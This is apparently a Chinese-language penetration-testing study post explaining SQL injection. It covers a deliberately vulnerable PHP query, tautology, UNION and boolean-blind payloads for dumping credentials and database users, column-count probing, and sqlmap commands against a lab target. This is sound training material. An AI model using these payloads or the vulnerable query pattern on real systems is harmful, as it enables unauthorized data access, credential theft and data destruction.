---
layout: post
title: "SQL Injections"
date: "2022-07-04"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# SQL Injections（SQL 注入）
这如何支持我的渗透测试生涯？
获得能力：
* 不受限制地访问 Web 应用程序数据
* 窃取凭据
* 完全控制 Web 应用程序

![backend-database.png](/img/in-post/ine/backend-database.png)

大多数 Web 应用程序使用某种**后端数据库**来存储它们处理的数据。 为了与数据库交互，系统操作员、程序员、应用程序和 Web 应用程序等实体使用**结构化查询语言 (SQL)**。

**SQL 注入 (SQLi)** 攻击允许未经授权的用户**控制** Web 应用程序使用的 **SQL 语句**。
这种攻击会对网站产生巨大影响，因为控制后端数据库意味着控制：
* 用户凭据
* Web 应用程序的数据
* 信用卡号码
* 购物交易
* 以及更多！

在学习如何进行攻击之前，我们必须了解一些 SQL 基础知识：
* SQL 语句语法
* 如何执行查询
* 如何合并两个查询的结果
* 注释的工作原理

## SQL Statements（SQL 语句）
**SQL 语句**如下所示：

```
SELECT name, description FROM products WHERE id=9;
```
这将查询数据库，询问 products 表中记录的name和description。 在此示例中，所选记录的 id 值将等于 9。

为了更好地理解 SQLi，您需要了解 SELECT 语句的基本语法：

```
SELECT <columns list> FROM <table> WHERE <condition>;
```

您可以在[此处](https://www.w3schools.com/sql/sql_intro.asp)找到有关 SQL 的更多信息。

也可以选择常数值：

```
SELECT 22, 'string', 0x12, 'another string';
```

您还需要知道 **UNION** 命令，它执行两个结果之间的联合：

```
<SELECT statement> UNION <other SELECT statement>;
```

最后，关于注释。 您可以使用两个字符串来注释 SQL 中的一行：
* #（井号）
* --（两个破折号后跟一个空格）

```
SELECT field FROM table; # this is a comment
SELECT field FROM table; -- this is another comment
```

在下面的幻灯片中，我们将看到在包含两个表的数据库上执行的一些 SQL 查询：

**Products**

|ID|Name|Description|
|---|---|---|
|1|Shoes|Nice shoes|
|3|Hat|Black hat|
|18|T-Shirt|Cheap|

**Accounts**

|Username|Password|Email|
|---|---|---|
|admin|HxZsO9AR|admin@site.com|
|staff|ihKdNTU4|staff@site.com|
|user|lwsi7Ks8|user@othersite.com|

### SELECT Example
以下两个**查询**提供相同的结果：
```
SELECT Name, Description FROM Products WHERE ID='1';
SELECT Name, Description FROM Products WHERE Name='Shoes';
```

查询的结果是一个只包含一行的**表**：
|Name|Description|
|---|---|
|Shoes|Nice shoes|

### UNION Example
这是两个 SELECT 语句之间的 UNION 示例：

```
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;
```

查询的结果是一个表，其中包含一行包含 Hat 项以及来自 Accounts 的所有用户名和密码。

|Name|Description|
|---|---|
|Hat|Black hat|
|admin|HxZsO9AR|
|staff|ihKdNTU4|
|user|lwsi7Ks8|

您还可以使用一些选定的数据执行 UNION：

```
SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT 'Example', 'Data';
```

查询的结果是一个表，其中包含带有 Hat 项目的行和提供的自定义行：

|Name|Description|
|---|---|
|Hat|Black hat|
|Example|Data|


## SQL Queries Inside Web Applications（Web 应用程序中的 SQL 查询）
前面的示例展示了在直接从其控制台查询数据库时如何使用 SQL。 要在 Web 应用程序中执行相同的任务，应用程序必须：
* **连接**到数据库
* 向数据库提交**查询**
* **检索**结果
然后，应用程序逻辑可以使用结果。

以下代码包含连接到 MySQL 数据库和执行查询的 PHP 示例。

```php
$dbhostname='1.2.3.4';
$dbuser='username';
$dbpassword='password';
$dbname='database';

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;";

$results = mysqli_query($connection, $query);
display_results($results);
```
前面的示例显示了 PHP 页面中的**静态查询**示例：
* `$connection` 是一个引用数据库连接的对象。
* `$query` 包含查询。
* `mysqli_query()` 是一个将查询提交到数据库的函数。
* 最后，自定义 `display_results()` 函数呈现数据。

下面是 PHP 中数据库交互的剖析。 此示例使用 MySQL 数据库。

```php
$dbhostname='1.2.3.4';
$dbuser='username';
$dbpassword='password';
$dbname='database'; # Configuration 配置

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname); # Connection 连接
$query = "SELECT Name, Description FROM Products WHERE ID='3' UNION SELECT Username, Password FROM Accounts;"; # Query definition 查询定义

$results = mysqli_query($connection, $query); # Submit 提交
display_results($results); # Usage 用法
```
## Vulnerable Dynamic Queries（易受攻击的动态查询）
然而，大多数时候查询不是静态的，它们确实是通过使用用户的输入**动态构建**的。 在这里您可以找到一个**易受攻击的**动态查询示例：

```php
$id = $_GET['id'];

$connection = mysqli_connect($dbhostname, $dbuser, $dbpassword, $dbname);
$query = "SELECT Name, Description FROM Products WHERE ID='$id';";

$results = mysqli_query($connection, $query);
display_results($results);
```

前面的示例显示了使用**用户提供的输入构建查询**（GET 请求的 id 参数）的代码。 然后代码将查询提交到数据库。
这种行为非常危险，因为恶意用户可以利用查询构造来控制数据库交互。 让我们看看如何！

我们在下面看到的动态查询：

```
SELECT Name, Description FROM Products WHERE ID='$id';
```
期望 `$id` 值，例如：

```
1 -> SELECT Name, Description FROM Products WHERE ID='1';
Example -> SELECT Name, Description FROM Products WHERE ID='Example';
Itid3 -> SELECT Name, Description FROM Products WHERE ID='Itid3';
```
或任何其他**字符串**。

但是，如果攻击者制作了一个可以将查询**更改**为类似以下内容的 `$id` 值怎么办：

```
' OR 'a'='a
```

然后查询变为：

```
SELECT Name, Description FROM Products WHERE ID='' OR 'a'='a';
```

这告诉数据库通过检查**两个条件**来选择项目：
* id 必须为空 (id='')
* **或**始终为真的条件 ('a'='a')

当第一个条件不满足时，SQL 引擎将考虑 OR 的第二个条件。 这第二个条件被设计为一个永远真实的条件。 换句话说，这告诉数据库选择 Products 表中的所有项目！

攻击者还可以通过提供以下内容来利用 UNION 命令：

```
' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a
```

因此，它将原始查询更改为：

```
SELECT Name, Description FROM Products WHERE ID='' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a';
```

这要求数据库选择 id 为**空**的项目，从而选择一个空集，然后与 Accounts 表中的所有条目执行联合。
通过使用有关数据库管理系统功能的一些深入知识，攻击者只需使用 Web 应用程序即可访问**整个数据库**。

## Finding SQL Injections（查找 SQL 注入）
要利用 SQL 注入，您首先必须找到**注入点**的位置，然后您可以制作**有效负载**来控制动态查询。
要识别注入点，您必须测试 Web 应用程序使用的**每个提供的用户输入**。

当我们谈论 Web 应用程序时，用户输入是：
* GET 参数
* POST 参数
* HTTP 标头
    * User-Agent
    * Cookie
    * Accept

**每个输入**都必须经过测试才能进行专业的渗透测试！

测试 SQL 注入的输入意味着尝试注入：
* 字符串终止符：`'` 和 `"`
* SQL 命令：`SELECT`、`UNION` 等
* SQL 注释：`#` 或 `--`

此外，检查 Web 应用程序是否开始出现异常行为。
请记住，始终**一次测试一次注入**！ 否则，你将无法理解什么注入向量是成功的。

### Example - Finding SQL Injections
我们来看看这个应用程序； 这是一个画廊。 您有一个带有一些缩略图的主页。

![gallery.png](/img/in-post/ine/gallery.png)

单击缩略图时，您可以看到全尺寸图像以及查看该图像的人数。

![full-size-image.png](/img/in-post/ine/full-size-image.png)

请注意，`id` GET 参数。 它是一个用户输入，因此我们可以对其进行测试以验证它是否容易受到 SQLi 的攻击。

![get-id-1141.png](/img/in-post/ine/get-id-1141.png)

这就是我们通过发送一个字符串终止字符得到的，这意味着 id 是一个注入点！

![id-is-an-injection-point.png](/img/in-post/ine/id-is-an-injection-point.png)

请记住，在渗透测试期间，您必须找到**所有漏洞**，因此您必须测试所有其他输入。 您不会只停留在找到的第一个注入点，还可以使用 Burp Proxy 来测试 Headers、Cookie 和 POST 参数。
不遗余力！

### Example - Using Burp to Test an Injection Point
在此示例中，我们将注入用户名 POST 参数。

![burp-username.png](/img/in-post/ine/burp-username.png)

### From Detection to Exploitation（从检测到利用）
寻找可能的注入点只是工作的一部分。 要成功**利用** SQL 注入，您需要了解正确的技术。
然后，在找到**手动**利用注入的最佳方法后，您可以使用自动工具**有效地自动化**利用。

## Boolean Based SQL Injections（基于布尔的 SQL 注入）
在前面的一个示例中，我们看到了如何使用精心设计的**有效负载**来强制查询检索表中的所有条目：

```
SELECT Name, Description FROM Products WHERE ID = '' OR 'a'='a';
```

有效负载使用一些布尔逻辑来强制查询包含所有条目。

在制作**基于布尔值的 SQLi** 有效负载时，您希望将查询转换为真/假条件，从而将其状态反映到 Web 应用程序输出。

让我们在前面的例子中尝试一下。
我们已经知道 `id` 是一个易受攻击的参数。

![id-is-an-injection-point.png](/img/in-post/ine/id-is-an-injection-point.png)

我们可以猜测动态查询结构：

```
SELECT <fields> FROM <table> WHERE id='<id parameter>';
```

查询可能类似于：

```
SELECT filename, views FROM images WHERE id='<id parameter>';
```

因此，我们可以尝试触发一个始终为真的条件，看看会发生什么。

我们可以使用 `' OR 'a'='a` 并看到应用程序显示图像。

![view116.png](/img/in-post/ine/view116.png)

让我们用另一个永远为真的条件来测试它：

```
' OR '1'='1
```

结果是一样的。

另一方面，始终为假的条件在数据库中找不到任何内容：

```
' OR '1'='11
```

没有图像，也没有查看计数器。 所以，这显然是一个可利用的 SQL 注入。

![boolean-based-sqli-false.png](/img/in-post/ine/boolean-based-sqli-false.png)

### Exploiting a Boolean Based SQLi（利用基于布尔的 SQLi）
一旦渗透测试人员找到了判断条件是真还是假的方法，他们就可以向数据库询问一些简单的真/假问题，例如：
* 用户名的第一个字母是“a”吗？
* 这个数据库是否包含三个表？
* 等等…

使用这种方法，渗透测试人员可以自由查询数据库！ 让我们看一个例子。

**EXAMPLE**
让我们看看使用基于布尔的 SQL 盲注来查找当前数据库用户的方法。
我们将使用两个 MySQL 函数：`user()` 和 `substring()`。

`user()` 返回当前使用数据库的用户名：

```
select user();

user()
root@localhost
```

```
select substring('elearnsecurity', 2, 1)
```

`substring()` 返回给定参数的子字符串。 它接受三个参数：输入字符串、子字符串的位置及其长度。[参考MySQL文档function_substring](https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_substring)。

```
select substring('elearnsecurity', 2, 1);

substring('elearnsecurity', 2, 1)
l
```

函数可以用作其他函数的参数。

```
select substring(user(), 1, 1);

r
```

SQL 允许您在真/假条件下测试函数的输出。

```
select substring(user(), 1, 1) = 'r' # True
1

select substring(user(), 1, 1) = 'a' # False
0
```

结合这些特性，我们可以通过使用有效载荷来迭代用户名的字母，例如：
* `' or substr(user(), 1, 1) = 'a`
* `' or substr(user(), 1, 1) = 'b`

当我们找到第一个字母时，我们可以移动到第二个：

* `' or substr(user(), 2, 1) = 'a`
* `' or substr(user(), 2, 1) = 'b`

直到我们知道整个用户名。

在这里我们可以看到Web应用程序的数据库用户名的第一个字母是“s”。
我们推断这是因为我们看到了图像，并且我们知道图像仅在 TRUE 条件下显示。

![first-letter-is-s.png](/img/in-post/ine/first-letter-is-s.png)

### Scripting Boolean Based SQL Injections（编写基于布尔值的 SQL 注入脚本）
手动提交查找用户名所需的所有有效负载是非常不切实际的。 用同样的方法提取整个数据库的内容几乎是不可能的。
在本章的最后，你将学习如何使用 SQLMap 来自动化你的 SQL 注入，但首先，让我们看看另一种注入类型。

## UNION Based SQL Injections（基于 UNION 的 SQL 注入）
很多时候，查询的一些结果会直接显示在输出页面上。
可以使用 `UNION` SQL 命令来利用此功能。

如果我们的有效负载使原始查询的结果为空，那么我们可以在页面上显示另一个由攻击者控制的查询的结果。

```
SELECT description FROM items WHERE id='' UNION SELECT user(); -- -';
```

以下负载强制 Web 应用程序在输出页面上显示 user() 函数的结果：

```
' UNION SELECT user(); -- -
```

让我们详细看看。

有效载荷分析

```
SELECT description FROM items WHERE id='' UNION SELECT user(); -- -';
```

原始查询

这将关闭原始查询中的字符串

此注释可防止数据库解析原始查询的以下部分

原始查询的剩余部分

![union-based-sql-payload-analysisi.png](/img/in-post/ine/union-based-sql-payload-analysisi.png)

还请注意我们在有效负载中使用的一个小**技巧**：注释不仅仅是**两个破折号和一个空格**，它还包含**第三个破折号**。
这是因为大多数浏览器会自动删除 URL 中的**尾随空格**，因此，如果您需要通过 GET 请求注入注释，则必须在注释的尾随空格后添加一个字符。

### Exploiting UNION SQL Injections
要利用 SQL 注入，您首先需要知道易受攻击的查询选择了多少字段。
您可以通过反复试验来做到这一点。

我们知道那里有一个注入，但是注入以下内容会给我们一个错误：

```
' UNION SELECT null; -- -
```
原始查询的字段数与我们的有效负载不匹配。

![exploiting-union-sql-injections.png](/img/in-post/ine/exploiting-union-sql-injections.png)

让我们尝试两个字段，这似乎有效！

```
' UNION SELECT null, null; -- -
```

![two-fields-work.png](/img/in-post/ine/two-fields-work.png)

让我们验证是否可以尝试使用三个字段。
该错误确认原始查询只有两个字段。

```
' UNION SELECT null, null, null; -- -
```

![three-fields-confirms.png](/img/in-post/ine/three-fields-confirms.png)

一旦我们知道查询中有多少字段，就该测试哪些字段是输出页面的一部分。 您可以通过注入一些已知值并在输出页面中检查结果来做到这一点。

例如，我们可以注入：

```
' UNION SELECT 'elsid1', 'elsid2'; -- -
```
似乎只有第一个字段会反映到输出中，但让我们看一下页面的源代码。

![elsid1_reflected.png](/img/in-post/ine/elsid1_reflected.png)

实际上，这两个字段都显示在输出中！

![elsid1-elsid2.png](/img/in-post/ine/elsid1-elsid2.png)

现在我们可以利用注入。 在本例中，我们通过查询 user() 来实现。
就是这样：只需一个请求，您就可以从数据库中检索数据。

```
' UNION SELECT user(), 'elsid2'; -- -
```

![querying-for-user.png](/img/in-post/ine/querying-for-user.png)

### Avoiding SQL Disaster（避免 SQL 灾难）
在攻击 SQL 漏洞时，您应该记住，不仅 SELECT 类型的查询容易受到攻击。

让我们考虑以下查询：

```
DELETE description FROM items WHERE id=[User Supplied Value];
```

而且，我们还要考虑以下注入：

```
DELETE description FROM items WHERE id='1' or '1'='1';
```

在这种情况下，每个**description**字段都将被清除，这意味着**对数据库的永久损坏**。

在注入 SQL 查询时，您应该对它的作用有一个简要的了解。 要理解它，您始终可以考虑在哪里找到 SQL 注入的应用程序功能的结果。
**它只是显示一些东西吗？ 还是修改了一些数据？**

## SQLMap
在了解了手动利用 SQL 注入的工作原理之后，是时候了解该领域中最好和最常用的工具之一了：**SQLMap！**

正如官方文档所说：“SQLMap 是一个开源渗透测试工具，可以自动检测和利用 SQL 注入漏洞并接管数据库服务器”。

使用 SQLMap，您可以**检测**和**利用** SQL 注入。
我们强烈建议您**先手动测试您的注入**，然后再使用该工具，因为如果您完全自动化，该工具可能会选择**低效的利用策略**，甚至会导致**远程服务崩溃！**

基本语法非常简单：

```
sqlmap -u <URL> -p <injection parameter> [options]
```

SQLMap 需要知道易受攻击的 URL 和用于测试 SQLi 的参数。 它甚至可以全自动运行，无需提供任何特定参数进行测试。

要在我们前面的示例中利用 SQLi，语法应该是：

```
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
```

这告诉 SQLMap 测试 view.php 的 GET 请求的 `id` 参数。 此外，它还告诉 SQLMap 使用基于 UNION 的 SQL 注入技术。

如果必须利用 POST 参数，则必须使用：

```
sqlmap -u <URL> --data=<POST string> -p parameter [options]
```

您还可以从 Burp 代理拦截的请求中复制 POST 字符串。

## Conclusions
SQL 注入是黑帽黑客最常用的攻击之一； 他们可以快速控制数据并获得对整个服务器的未经授权的访问！
作为一名渗透测试人员，您必须找到一种方法来利用 SQL 注入，而不会破坏您客户端的 Web 应用程序或导致拒绝服务。 与道德黑客一样，知识是成功的关键！

[Introduction to SQL](https://www.w3schools.com/sql/sql_intro.asp)
